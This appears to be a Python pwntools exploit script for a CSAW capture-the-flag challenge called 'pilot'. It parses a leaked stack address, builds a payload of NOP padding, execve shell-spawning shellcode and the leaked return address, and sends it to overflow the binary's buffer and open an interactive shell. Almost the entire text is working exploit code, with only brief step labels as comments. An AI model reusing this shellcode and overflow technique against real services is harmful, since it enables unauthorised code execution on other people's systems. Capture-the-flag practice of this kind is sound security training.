#Import pwntools
from pwn import *

#Establish the target
target = process('./pilot')
context.binary = ELF('pilot')
#target = remote("pwn.chal.csaw.io", 8464)

#Attach gdb
#gdb.attach(target)

#Print out the initial text
print target.recvuntil("[*]Good Luck Pilot!....")

#Scan in and filter out the infoleak
target.recvline()
leak = target.recvline()
print leak
leak = leak.replace("[*]Location:", "")
leak = int(leak, 16)

#Print out the infoleak, then prompt for input as a break
log.info("The leak is: " + hex(leak))
print target.recvuntil("[*]Command:", "")
raw_input()

#Establish the shellcode, the offsets, and the payload
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
offset = "\x90"*(32 - len(shellcode)/2)
payload = offset + shellcode + offset + p64(leak)

#Send the payload
target.send(payload)

#Drop to an interactive shell
target.interactive()
